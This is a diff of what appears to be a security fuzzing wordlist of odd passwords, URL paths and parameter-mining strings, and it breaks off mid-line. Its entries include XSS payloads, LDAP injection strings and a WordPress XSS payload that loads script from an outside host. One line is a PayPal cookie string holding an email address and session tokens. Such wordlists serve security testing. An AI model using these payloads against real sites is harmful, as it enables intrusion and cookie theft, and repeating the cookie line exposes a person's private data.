@@ -11,6 +11,7 @@
 !&)(!(*(
 !(!)(#
 !(!@!(*#
+!(#(_lp
 !(#832nike!
 !(&#!)
 !(&#%
@@ -22,6 +23,7 @@
 !((yrl520
 !()!
 !(*&!(*&
+!(*&hip-hop1987
 !(*(.@(.!!
 !(*(aber
 !(*(}"?{:>
@@ -154,10 +156,12 @@ $@!(!^&
 (*****)99
 (******)
 (*80comanome08*)
+(*90*)
 (*_*)
 (*crackme*)
 (*enter*)
 (*muli*)
+(*october26*)
 (*pils*)
 (*rochim*)
 (@@)9(**)ff
@@ -238,8 +242,10 @@ $@!(!^&
 *))%00
 *)*
 *)*&(&*
+*)7+
 *)8&&%1(
 *)9
+*)f+
 *)p
 **)*&)(*
 **)7dkng63zk3v
@@ -279,9 +285,11 @@ $@!(!^&
 /general/userinfo.php?uid=1
 /irj/servlet/prt/portal/prtroot/pcd!(*)
 /profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+/userinfo.php?uid=1;
 /v1/assessment/c=7:_q\*)/markingcriteria
 /wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&uid=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&token=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&email=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();
 /wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&uid=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&token=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&email=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();
+04222011kscc!((%
 0=(a*)=0
 0ct0ber!(
 1 &^)*)#
@@ -298,9 +306,11 @@ $@!(!^&
 13579@^*)
 13579qsc@^*)
 14 jan!(*(
+1511980!%!!(*)
 15aug!(@*
 19!(95(%
 191290!@!(()
+1968!(^*
 1981!(*!
 198712!(*&!@
 1992!((@
@@ -340,6 +350,7 @@ $@!(!^&
 5!(q*,u@kv,""j<z6g<j~2f
 532$*)
 5ngwwctpjy++zurr+ik2uu6imou=
+6!!kp!((%
 656yoyoyo*)
 726044464!((@
 7882451lu#!(
@@ -367,16 +378,27 @@ $@!(!^&
 <script>if("x\*chr*".length==1) { log(*num*);}</script>
 <ubj$npj3y]|(u
 =6rj8icn=o1<y+&=
+=nrj_news_city_page&uid=
 > to: /cn=robots/@nexor.co.uk
 ?*kuid=
 ?*referrer_vuid=
+?admitad_uid=
+?cn=sexuality
 ?cta_guid=
 ?customerguid=
 ?customize_changeset_uuid=
 ?davuid=
+?dc=
+?fromuid=
 ?guid=
+?icid=qq0w&src=qq1w&l=qq2w&ncid=qq3w&done=qq4w&locale=qq5w&queue=qq6w&ref=qq7w&intl=qq8w&utm_content=qq9w&d=qq10w&err=qq11w&err_url=qq12w&inid=qq13w&region=qq14w&source=qq15w&client_id=qq16w&r=qq17w&_=qq18w&partner=qq19w&cid=qq20w&language=qq21w&loc=qq22w&impressions=qq23w&g=qq24w&cc=qq25w&country=qq26w&method=qq27w&pagename=qq28w&height=qq29w&b=qq30w&width=qq31w&ut_source=qq32w&sid=qq33w&k=qq34w&category=qq35w&pid=qq36w&tz=qq37w&cb=qq38w&amp=qq39w&mid=qq40w&size=qq41w&cat=qq42w&replytocom=qq43w&bw=qq44w&vp=qq45w&bh=qq46w&j=qq47w&tag=qq48w&location=qq49w&redirect_uri=qq50w&promo=qq51w&returnurl=qq52w&autoplay=qq53w&utm_hp_ref=qq54w&ver=qq55w&ts=qq56w&act=qq57w&events=qq58w&comuto_cmkt=qq59w&device=qq60w&aqb=qq61w&os=qq62w&aqe=qq63w&lg=qq64w&productid=qq65w&bam=qq66w&o=qq67w&fr=qq68w&nomobile=qq69w&utm_term=qq70w&hl=qq71w&fn=qq72w&ce=qq73w&service=qq74w&i=qq75w&ad=qq76w&tn=qq77w&referer=qq78w&ndh=qq79w&channel=qq80w&e=qq81w&languagecode=qq82w&ct=qq83w&n=qq84w&countrycode=qq85w&rating=qq86w&radius=qq87w&fcc=qq88w&fc=qq89w&route=qq90w&appid=qq91w&bv=qq92w&return_to=qq93w&version=qq94w&y=qq95w&ch=qq96w&_bc=qq97w&content_id=qq98w&ugccmtnav=qq99w&_id=qq100w&scope=qq101w&server=qq102w&menu_id=qq103w&z=qq104w&rid=qq105w&x=qq106w&no_prefetch=qq107w&app_version=qq108w&st=qq109w&product=qq110w&link=qq111w&s_it=qq112w&tid=qq113w&lid=qq114w&boardid=qq115w&origin=qq116w&cpdl=qq117w&target=qq118w&ie=qq119w&cp=qq120w&op=qq121w&base_image=qq122w&guid=qq123w&week=qq124w&tt=qq125w&access_token=qq126w&soc_src=qq127w&purl=qq128w&count=qq129w&sitestate=qq130w&tp=qq131w&v_t=qq132w&mod=qq133w&w=qq134w&area=qq135w&pf=qq136w&skip=qq137w&city=qq138w&siteid=qq139w&uid=qq140w&tc=qq141w&referrer=qq142w&feature=qq143w&cookie=qq144w&si=qq145w&currency=qq146w&context=qq147w&gclid=qq148w&jk=qq149w&_crumb=qq150w&sec=qq151w&ns=qq152w&res=qq153w&&sq8gv=qq154w&
+?idc=
 ?kuid=
+?pguid=
 ?quid=
+?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&sem=qq7w&msg=qq8w&auid=qq9w&bucket=qq10w&flv=qq11w&la=qq12w&section=qq13w&tk=qq14w&exchange=qq15w&returnto=qq16w&pccr=qq17w&vidn=qq18w&change_view=qq19w&iframe=qq20w&trackingid=qq21w&zip=qq22w&video=qq23w&dev_info=qq24w&cmp=qq25w&subid=qq26w&srv=qq27w&pagenum=qq28w&_device=qq29w&fromsearch=qq30w&nid=qq31w&pu=qq32w&enc=qq33w&displocale=qq34w&p_p_col_pos=qq35w&bi_m=qq36w&mod_units=qq37w&per_page=qq38w&urn=qq39w&orderby=qq40w&oc=qq41w&n[]=qq42w&v[]=qq43w&m_id=qq44w&env=qq45w&bi_c=qq46w&vendorid=qq47w&kw=qq48w&orgid=qq49w&sd=qq50w&m_mode=qq51w&mod_id=qq52w&_p=qq53w&imgsize=qq54w&page_size=qq55w&force_units=qq56w&kid=qq57w&lp=qq58w&iast=qq59w&toc=qq60w&send_image=qq61w&aaaa=qq62w&cmpid=qq63w&session_id=qq64w&icmpid=qq65w&searchtype=qq66w&ir=qq67w&property=qq68w&nonce=qq69w&dur=qq70w&rt=qq71w&catid=qq72w&zoneid=qq73w&pagetype=qq74w&versionid=qq75w&dnt=qq76w&sw=qq77w&fb=qq78w&wa_ref=qq79w&themeid=qq80w&secret=qq81w&ve=qq82w&pgrp=qq83w&yp=qq84w&print=qq85w&anonymous_id=qq86w&instance_id=qq87w&campaign=qq88w&adid=qq89w&networkid=qq90w&za=qq91w&section_name=qq92w&sn=qq93w&cv=qq94w&vk=qq95w&noclear=qq96w&ll=qq97w&script=qq98w&parent=qq99w&refer=qq100w&visittoken=qq101w&uniqtoken=qq102w&submit=qq103w&_aolform=qq104w&mute=qq105w&creativeasin=qq106w&sx=qq107w&om_sem_cid=qq108w&schema=qq109w&synid=qq110w&evtinc=qq111w&epc=qq112w&adsiteid=qq113w&pctvr=qq114w&applocation=qq115w&isengagement=qq116w&cliid=qq117w&_mode=qq118w&gameid=qq119w&quality=qq120w&nolz=qq121w&message=qq122w&ctkrcv=qq123w&nav=qq124w&radius_miles=qq125w&distro=qq126w&_subaction=qq127w&pageurl=qq128w&send_gift=qq129w&ok=qq130w&days_ago=qq131w&_dirquery=qq132w&sortby=qq133w&wmode=qq134w&slt=qq135w&sh=qq136w&&5tpxy=qq137w&
+?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&sem=qq7w&msg=qq8w&auid=qq9w&bucket=qq10w&flv=qq11w&la=qq12w&section=qq13w&tk=qq14w&exchange=qq15w&returnto=qq16w&pccr=qq17w&vidn=qq18w&change_view=qq19w&iframe=qq20w&trackingid=qq21w&zip=qq22w&video=qq23w&dev_info=qq24w&cmp=qq25w&subid=qq26w&srv=qq27w&pagenum=qq28w&_device=qq29w&fromsearch=qq30w&nid=qq31w&pu=qq32w&enc=qq33w&displocale=qq34w&p_p_col_pos=qq35w&bi_m=qq36w&mod_units=qq37w&per_page=qq38w&urn=qq39w&orderby=qq40w&oc=qq41w&n[]=qq42w&v[]=qq43w&m_id=qq44w&env=qq45w&bi_c=qq46w&vendorid=qq47w&kw=qq48w&orgid=qq49w&sd=qq50w&m_mode=qq51w&mod_id=qq52w&_p=qq53w&imgsize=qq54w&page_size=qq55w&force_units=qq56w&kid=qq57w&lp=qq58w&iast=qq59w&toc=qq60w&send_image=qq61w&aaaa=qq62w&cmpid=qq63w&session_id=qq64w&icmpid=qq65w&searchtype=qq66w&ir=qq67w&property=qq68w&nonce=qq69w&dur=qq70w&rt=qq71w&catid=qq72w&zoneid=qq73w&pagetype=qq74w&versionid=qq75w&dnt=qq76w&sw=qq77w&fb=qq78w&wa_ref=qq79w&themeid=qq80w&secret=qq81w&ve=qq82w&pgrp=qq83w&yp=qq84w&print=qq85w&anonymous_id=qq86w&instance_id=qq87w&campaign=qq88w&adid=qq89w&networkid=qq90w&za=qq91w&section_name=qq92w&sn=qq93w&cv=qq94w&vk=qq95w&noclear=qq96w&ll=qq97w&script=qq98w&parent=qq99w&refer=qq100w&visittoken=qq101w&uniqtoken=qq102w&submit=qq103w&_aolform=qq104w&mute=qq105w&creativeasin=qq106w&sx=qq107w&om_sem_cid=qq108w&schema=qq109w&synid=qq110w&evtinc=qq111w&epc=qq112w&adsiteid=qq113w&pctvr=qq114w&applocation=qq115w&isengagement=qq116w&cliid=qq117w&_mode=qq118w&gameid=qq119w&quality=qq120w&nolz=qq121w&message=qq122w&ctkrcv=qq123w&nav=qq124w&radius_miles=qq125w&distro=qq126w&_subaction=qq127w&pageurl=qq128w&send_gift=qq129w&ok=qq130w&days_ago=qq131w&_dirquery=qq132w&sortby=qq133w&wmode=qq134w&slt=qq135w&sh=qq136w&&oyrgn=qq137w&
+?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&sem=qq7w&msg=qq8w&auid=qq9w&bucket=qq10w&flv=qq11w&la=qq12w&section=qq13w&tk=qq14w&exchange=qq15w&returnto=qq16w&pccr=qq17w&vidn=qq18w&change_view=qq19w&iframe=qq20w&trackingid=qq21w&zip=qq22w&video=qq23w&dev_info=qq24w&cmp=qq25w&subid=qq26w&srv=qq27w&pagenum=qq28w&_device=qq29w&fromsearch=qq30w&nid=qq31w&pu=qq32w&enc=qq33w&displocale=qq34w&p_p_col_pos=qq35w&bi_m=qq36w&mod_units=qq37w&per_page=qq38w&urn=qq39w&orderby=qq40w&oc=qq41w&n[]=qq42w&v[]=qq43w&m_id=qq44w&env=qq45w&bi_c=qq46w&vendorid=qq47w&kw=qq48w&orgid=qq49w&sd=qq50w&m_mode=qq51w&mod_id=qq52w&_p=qq53w&imgsize=qq54w&page_size=qq55w&force_units=qq56w&kid=qq57w&lp=qq58w&iast=qq59w&toc=qq60w&send_image=qq61w&aaaa=qq62w&cmpid=qq63w&session_id=qq64w&icmpid=qq65w&searchtype=qq66w&ir=qq67w&property=qq68w&nonce=qq69w&dur=qq70w&rt=qq71w&catid=qq72w&zoneid=qq73w&pagetype=qq74w&versionid=qq75w&dnt=qq76w&sw=qq77w&fb=qq78w&wa_ref=qq79w&themeid=qq80w&secret=qq81w&ve=qq82w&pgrp=qq83w&yp=qq84w&print=qq85w&anonymous_id=qq86w&instance_id=qq87w&campaign=qq88w&adid=qq89w&networkid=qq90w&za=qq91w&section_name=qq92w&sn=qq93w&cv=qq94w&vk=qq95w&noclear=qq96w&ll=qq97w&script=qq98w&parent=qq99w&refer=qq100w&visittoken=qq101w&uniqtoken=qq102w&submit=qq103w&_aolform=qq104w&mute=qq105w&creativeasin=qq106w&sx=qq107w&om_sem_cid=qq108w&schema=qq109w&synid=qq110w&evtinc=qq111w&epc=qq112w&adsiteid=qq113w&pctvr=qq114w&applocation=qq115w&isengagement=qq116w&cliid=qq117w&_mode=qq118w&gameid=qq119w&quality=qq120w&nolz=qq121w&message=qq122w&ctkrcv=qq123w&nav=qq124w&radius_miles=qq125w&distro=qq126w&_subaction=qq127w&pageurl=qq128w&send_gift=qq129w&ok=qq130w&days_ago=qq131w&_dirquery=qq132w&sortby=qq133w&wmode=qq134w&slt=qq135w&sh=qq136w&&wcsak=qq137w&
 ?refuid=
 ?sm_guid=
 ?uid=
@@ -424,11 +446,13 @@ admin)(!(&(|
 admin))(|(|
 admin*)((|userpassword=*)
 admin,@#$%^&*!()
+admitad_uid=
 aezakme@$@!(&!
 af20!(im
 ai*))!@wlamrhnsdk$%*@u~ksdu34id^
 albert!($@
 aleksei!(
+all.php?menuid=
 allinurl:"macgurublog.php?uid="
 altavista!(24
 am#@!(*(
@@ -460,6 +484,10 @@ ander!(
 anilram)()(!(&(
 anilram)()(!(&(t4yad!h*7#7!@-+)(ma4ritzx4!!
 api/url/article?uuid=*
+api/wizards/getlanguages/sfacilityguid=null&slocationguid=null
+apps.php?q=article&uid=
+apps.php?q=diary&uid=
+apps.php?q=photos&uid=
 arhitekt!(86
 arndell@(!(@
 arumico!$)*)%
@@ -469,6 +497,7 @@ atina!(82
 atkri'!()forteen555first$
 august!((!
 august11*)
+auto!(*^
 az!(*^
 a|(oy
 badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%40%2a%29%3d$attgcount$end"`
@@ -497,6 +526,8 @@ c$|(3 (e7_sm4i
 c@r*i%nt#o!(s
 cacdc=
 caiqi!(^$
+cats?icid=qq0w&src=qq1w&l=qq2w&ncid=qq3w&done=qq4w&locale=qq5w&queue=qq6w&ref=qq7w&intl=qq8w&utm_content=qq9w&d=qq10w&err=qq11w&err_url=qq12w&inid=qq13w&region=qq14w&source=qq15w&client_id=qq16w&r=qq17w&_=qq18w&partner=qq19w&cid=qq20w&language=qq21w&loc=qq22w&impressions=qq23w&g=qq24w&cc=qq25w&country=qq26w&method=qq27w&pagename=qq28w&height=qq29w&b=qq30w&width=qq31w&ut_source=qq32w&sid=qq33w&k=qq34w&category=qq35w&pid=qq36w&tz=qq37w&cb=qq38w&amp=qq39w&mid=qq40w&size=qq41w&cat=qq42w&replytocom=qq43w&bw=qq44w&vp=qq45w&bh=qq46w&j=qq47w&tag=qq48w&location=qq49w&redirect_uri=qq50w&promo=qq51w&returnurl=qq52w&autoplay=qq53w&utm_hp_ref=qq54w&ver=qq55w&ts=qq56w&act=qq57w&events=qq58w&comuto_cmkt=qq59w&device=qq60w&aqb=qq61w&os=qq62w&aqe=qq63w&lg=qq64w&productid=qq65w&bam=qq66w&o=qq67w&fr=qq68w&nomobile=qq69w&utm_term=qq70w&hl=qq71w&fn=qq72w&ce=qq73w&service=qq74w&i=qq75w&ad=qq76w&tn=qq77w&referer=qq78w&ndh=qq79w&channel=qq80w&e=qq81w&languagecode=qq82w&ct=qq83w&n=qq84w&countrycode=qq85w&rating=qq86w&radius=qq87w&fcc=qq88w&fc=qq89w&route=qq90w&appid=qq91w&bv=qq92w&return_to=qq93w&version=qq94w&y=qq95w&ch=qq96w&_bc=qq97w&content_id=qq98w&ugccmtnav=qq99w&_id=qq100w&scope=qq101w&server=qq102w&menu_id=qq103w&z=qq104w&rid=qq105w&x=qq106w&no_prefetch=qq107w&app_version=qq108w&st=qq109w&product=qq110w&link=qq111w&s_it=qq112w&tid=qq113w&lid=qq114w&boardid=qq115w&origin=qq116w&cpdl=qq117w&target=qq118w&ie=qq119w&cp=qq120w&op=qq121w&base_image=qq122w&guid=qq123w&week=qq124w&tt=qq125w&access_token=qq126w&soc_src=qq127w&purl=qq128w&count=qq129w&sitestate=qq130w&tp=qq131w&v_t=qq132w&mod=qq133w&w=qq134w&area=qq135w&pf=qq136w&skip=qq137w&city=qq138w&siteid=qq139w&uid=qq140w&tc=qq141w&referrer=qq142w&feature=qq143w&cookie=qq144w&si=qq145w&currency=qq146w&context=qq147w&gclid=qq148w&jk=qq149w&_crumb=qq150w&sec=qq151w&ns=qq152w&res=qq153w&&znylx=qq154w&
+cats?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&sem=qq7w&msg=qq8w&auid=qq9w&bucket=qq10w&flv=qq11w&la=qq12w&section=qq13w&tk=qq14w&exchange=qq15w&returnto=qq16w&pccr=qq17w&vidn=qq18w&change_view=qq19w&iframe=qq20w&trackingid=qq21w&zip=qq22w&video=qq23w&dev_info=qq24w&cmp=qq25w&subid=qq26w&srv=qq27w&pagenum=qq28w&_device=qq29w&fromsearch=qq30w&nid=qq31w&pu=qq32w&enc=qq33w&displocale=qq34w&p_p_col_pos=qq35w&bi_m=qq36w&mod_units=qq37w&per_page=qq38w&urn=qq39w&orderby=qq40w&oc=qq41w&n[]=qq42w&v[]=qq43w&m_id=qq44w&env=qq45w&bi_c=qq46w&vendorid=qq47w&kw=qq48w&orgid=qq49w&sd=qq50w&m_mode=qq51w&mod_id=qq52w&_p=qq53w&imgsize=qq54w&page_size=qq55w&force_units=qq56w&kid=qq57w&lp=qq58w&iast=qq59w&toc=qq60w&send_image=qq61w&aaaa=qq62w&cmpid=qq63w&session_id=qq64w&icmpid=qq65w&searchtype=qq66w&ir=qq67w&property=qq68w&nonce=qq69w&dur=qq70w&rt=qq71w&catid=qq72w&zoneid=qq73w&pagetype=qq74w&versionid=qq75w&dnt=qq76w&sw=qq77w&fb=qq78w&wa_ref=qq79w&themeid=qq80w&secret=qq81w&ve=qq82w&pgrp=qq83w&yp=qq84w&print=qq85w&anonymous_id=qq86w&instance_id=qq87w&campaign=qq88w&adid=qq89w&networkid=qq90w&za=qq91w&section_name=qq92w&sn=qq93w&cv=qq94w&vk=qq95w&noclear=qq96w&ll=qq97w&script=qq98w&parent=qq99w&refer=qq100w&visittoken=qq101w&uniqtoken=qq102w&submit=qq103w&_aolform=qq104w&mute=qq105w&creativeasin=qq106w&sx=qq107w&om_sem_cid=qq108w&schema=qq109w&synid=qq110w&evtinc=qq111w&epc=qq112w&adsiteid=qq113w&pctvr=qq114w&applocation=qq115w&isengagement=qq116w&cliid=qq117w&_mode=qq118w&gameid=qq119w&quality=qq120w&nolz=qq121w&message=qq122w&ctkrcv=qq123w&nav=qq124w&radius_miles=qq125w&distro=qq126w&_subaction=qq127w&pageurl=qq128w&send_gift=qq129w&ok=qq130w&days_ago=qq131w&_dirquery=qq132w&sortby=qq133w&wmode=qq134w&slt=qq135w&sh=qq136w&&m6y7y=qq137w&
 cc%&*)(!*00
 cc: /cn=robots/@nexor.co.uk
 censys_uid=
@@ -511,10 +542,13 @@ cn=admin
 cn=dacceptatieloket
 cn=directory manager
 cn=orcladmin
+cn=orcladmin welcome
 cookie_check=yes; lang=en_us%3bus; tsrce=settingsnodeweb; ts=vr%3de012017a1640a101aa0c24dafffd19fe%26vrexpyrs%3d1627438410%26vtexpyrs%3d1532769433%26vt%3de01201911640a101aa0c24dafffd19fd; x-pp-s=eyj0ijoimtuzmjc2nzy2ndq5myisim0ioiiwin0; nsid=s%3ay8glvpmkfkxj_mr2hof2tvmhueguxf1n.8s5le6ieok4gevlg59wyswy8xxzcycxwk7nwtun3utq; akdc=ccg11-origin-www-1.paypal.com; akavpau_ppsd=1532768264~id=928bd1c25ce0be991ae8f454b7c7fc8c; xppcts=f34bc8847fea2560; login_email=pete.johnson%40shaw.ca; ui_experience=home%3d2%26login_type%3demail_password; fn_dt=344a91a6fb904898a12a18a9a268cfcf; id_token=idtoken3a976f8244b84dfe948aa108edef4953; khcl0euy7aksmgfvhl7j5e7hptk=wguwe1-mrq4xoiqepo9cyaieqt2dgexq3mfzofvq-6br53skk66ufddoukdh35iuwjwxzeo33lpstkal; hac80bwxscjqz7km6voxulob534=4sixhbrkowaac6vovotkkvgd937rbje-l3g1b6zvfps0xsennvljdymdx1nsoq5e2nyynxwatknrkuhqavt9bxsdyfug8akgxrurrxw9rptrnzoll5b_2qkvbd_i6gqiwkilz0; x-pp-ads=atoboc1cw36jqolibn15jwf.2uvpho4; navcmd=_restriction-details; x-pp-p=px45apy-swrncghzjjzv6vdwdmordffif07-wchblleotuwiplwkbamfdwd6x.zga3das4imy-eotdphtc2fkw2bqb3ctl1n4ydwv9rwbkxioejsfkupxlmxgnvny5jbgnn3zevmr8nar969rtxhuyf9nbe7fgwihrnox0yz.dxxf6qux8ggvnh12nnyk.8alk2owfx3y8jdst8wtag9mtqy7zrzzsl-xtzabaarsuufulswdjuixpcs-o1ki484; segm=kpdr9wad9vnd2klo5j9sdt3jd9dr8ddbshd72ddrt8zqpln941oplfgh9isom0wdwngll83ghjir932dfkd8fcou; cwrclyrk4locv1fydgbaxinl6ig=off2i1vuw2k_ftkk5if_rl61amxxjgyp4ekn16v1tfjk5_e01fzhgus6h0ojnguomuyi3rynk5yykbm7unnli5mpha21vzgenb_ggqybqdblrw9uygrhmcywqe4gcve2afr0ebpddcyvwwp2hpf8f0pwpkqsyzc7c22bzsigaoblsn3lysnbaezbawkwhn1vwb3d_91yehpdnf-rgh6df3reyxfzssntwo5kugue7knpamyqil_ngqoj0la
+cpamit_uid=
 crick3ts4uce*)3
 cruz!(*)
 cta_guid=
+curso/graduacao/cur010_disciplinaprofessor.aspx?dc=bab8adaccaa9
 dasantx!(8vccag
 data.asp?mydata=aa==&uid=aaa.bbb.ccc.ddd&state=3067203
 dc=$((binrange/itwo))
@@ -545,6 +579,8 @@ fbobh_i*)6
 fbobh_l*)y
 fender!(^!
 ff4\x>.jv1g=jtm*)xcy*(x/km7d=?
+file?uuid=
+finn/travel/hotel/result?dc=
 fls)&@#(&!(@
 fqxw*))fuai
 fred!(*(
@@ -552,6 +588,7 @@ fuckyou=
 fuckyou=1
 g!(c#
 g**)^20c
+general/userinfo.php?uid=1
 gold!(
 gold!(&(
 greg!((5
@@ -573,6 +610,7 @@ idc!#%&(@^*)
 idc13579@$^*)
 idc@$^*)08642
 idc@$^*)24680
+ie50/system/login/sysloginuser.aspx?login=denied&uid=%3c%2fscript%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e
 if [[ $i =~ $question$question && "$methodical" =~ "post" && $i =~ !($question$question$question) ]] ; then
 if [[ $line =~ $equals && !($line =~ $colon) && !($line =~ $question) && !($line =~ $equalcheck) ]]; then
 if [[ $line =~ $post && !($line =~ $question) ]]; then
@@ -585,6 +623,8 @@ iluhin!(%%
 in reply to /cn=robots-errors/@nexor.co.uk's message:
 index.aspx?puid=cfb00753-f97c-4587-966d-de9ece6bebdc*
 index.aspx?puid=d16f18b4-73a8-48f5-b506-a9a4ce0119ff*
+index.html?icid=qq0w&src=qq1w&l=qq2w&ncid=qq3w&done=qq4w&locale=qq5w&queue=qq6w&ref=qq7w&intl=qq8w&utm_content=qq9w&d=qq10w&err=qq11w&err_url=qq12w&inid=qq13w&region=qq14w&source=qq15w&client_id=qq16w&r=qq17w&_=qq18w&partner=qq19w&cid=qq20w&language=qq21w&loc=qq22w&impressions=qq23w&g=qq24w&cc=qq25w&country=qq26w&method=qq27w&pagename=qq28w&height=qq29w&b=qq30w&width=qq31w&ut_source=qq32w&sid=qq33w&k=qq34w&category=qq35w&pid=qq36w&tz=qq37w&cb=qq38w&amp=qq39w&mid=qq40w&size=qq41w&cat=qq42w&replytocom=qq43w&bw=qq44w&vp=qq45w&bh=qq46w&j=qq47w&tag=qq48w&location=qq49w&redirect_uri=qq50w&promo=qq51w&returnurl=qq52w&autoplay=qq53w&utm_hp_ref=qq54w&ver=qq55w&ts=qq56w&act=qq57w&events=qq58w&comuto_cmkt=qq59w&device=qq60w&aqb=qq61w&os=qq62w&aqe=qq63w&lg=qq64w&productid=qq65w&bam=qq66w&o=qq67w&fr=qq68w&nomobile=qq69w&utm_term=qq70w&hl=qq71w&fn=qq72w&ce=qq73w&service=qq74w&i=qq75w&ad=qq76w&tn=qq77w&referer=qq78w&ndh=qq79w&channel=qq80w&e=qq81w&languagecode=qq82w&ct=qq83w&n=qq84w&countrycode=qq85w&rating=qq86w&radius=qq87w&fcc=qq88w&fc=qq89w&route=qq90w&appid=qq91w&bv=qq92w&return_to=qq93w&version=qq94w&y=qq95w&ch=qq96w&_bc=qq97w&content_id=qq98w&ugccmtnav=qq99w&_id=qq100w&scope=qq101w&server=qq102w&menu_id=qq103w&z=qq104w&rid=qq105w&x=qq106w&no_prefetch=qq107w&app_version=qq108w&st=qq109w&product=qq110w&link=qq111w&s_it=qq112w&tid=qq113w&lid=qq114w&boardid=qq115w&origin=qq116w&cpdl=qq117w&target=qq118w&ie=qq119w&cp=qq120w&op=qq121w&base_image=qq122w&guid=qq123w&week=qq124w&tt=qq125w&access_token=qq126w&soc_src=qq127w&purl=qq128w&count=qq129w&sitestate=qq130w&tp=qq131w&v_t=qq132w&mod=qq133w&w=qq134w&area=qq135w&pf=qq136w&skip=qq137w&city=qq138w&siteid=qq139w&uid=qq140w&tc=qq141w&referrer=qq142w&feature=qq143w&cookie=qq144w&si=qq145w&currency=qq146w&context=qq147w&gclid=qq148w&jk=qq149w&_crumb=qq150w&sec=qq151w&ns=qq152w&res=qq153w&&qf7b8=qq154w&
+index.html?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&sem=qq7w&msg=qq8w&auid=qq9w&bucket=qq10w&flv=qq11w&la=qq12w&section=qq13w&tk=qq14w&exchange=qq15w&returnto=qq16w&pccr=qq17w&vidn=qq18w&change_view=qq19w&iframe=qq20w&trackingid=qq21w&zip=qq22w&video=qq23w&dev_info=qq24w&cmp=qq25w&subid=qq26w&srv=qq27w&pagenum=qq28w&_device=qq29w&fromsearch=qq30w&nid=qq31w&pu=qq32w&enc=qq33w&displocale=qq34w&p_p_col_pos=qq35w&bi_m=qq36w&mod_units=qq37w&per_page=qq38w&urn=qq39w&orderby=qq40w&oc=qq41w&n[]=qq42w&v[]=qq43w&m_id=qq44w&env=qq45w&bi_c=qq46w&vendorid=qq47w&kw=qq48w&orgid=qq49w&sd=qq50w&m_mode=qq51w&mod_id=qq52w&_p=qq53w&imgsize=qq54w&page_size=qq55w&force_units=qq56w&kid=qq57w&lp=qq58w&iast=qq59w&toc=qq60w&send_image=qq61w&aaaa=qq62w&cmpid=qq63w&session_id=qq64w&icmpid=qq65w&searchtype=qq66w&ir=qq67w&property=qq68w&nonce=qq69w&dur=qq70w&rt=qq71w&catid=qq72w&zoneid=qq73w&pagetype=qq74w&versionid=qq75w&dnt=qq76w&sw=qq77w&fb=qq78w&wa_ref=qq79w&themeid=qq80w&secret=qq81w&ve=qq82w&pgrp=qq83w&yp=qq84w&print=qq85w&anonymous_id=qq86w&instance_id=qq87w&campaign=qq88w&adid=qq89w&networkid=qq90w&za=qq91w&section_name=qq92w&sn=qq93w&cv=qq94w&vk=qq95w&noclear=qq96w&ll=qq97w&script=qq98w&parent=qq99w&refer=qq100w&visittoken=qq101w&uniqtoken=qq102w&submit=qq103w&_aolform=qq104w&mute=qq105w&creativeasin=qq106w&sx=qq107w&om_sem_cid=qq108w&schema=qq109w&synid=qq110w&evtinc=qq111w&epc=qq112w&adsiteid=qq113w&pctvr=qq114w&applocation=qq115w&isengagement=qq116w&cliid=qq117w&_mode=qq118w&gameid=qq119w&quality=qq120w&nolz=qq121w&message=qq122w&ctkrcv=qq123w&nav=qq124w&radius_miles=qq125w&distro=qq126w&_subaction=qq127w&pageurl=qq128w&send_gift=qq129w&ok=qq130w&days_ago=qq131w&_dirquery=qq132w&sortby=qq133w&wmode=qq134w&slt=q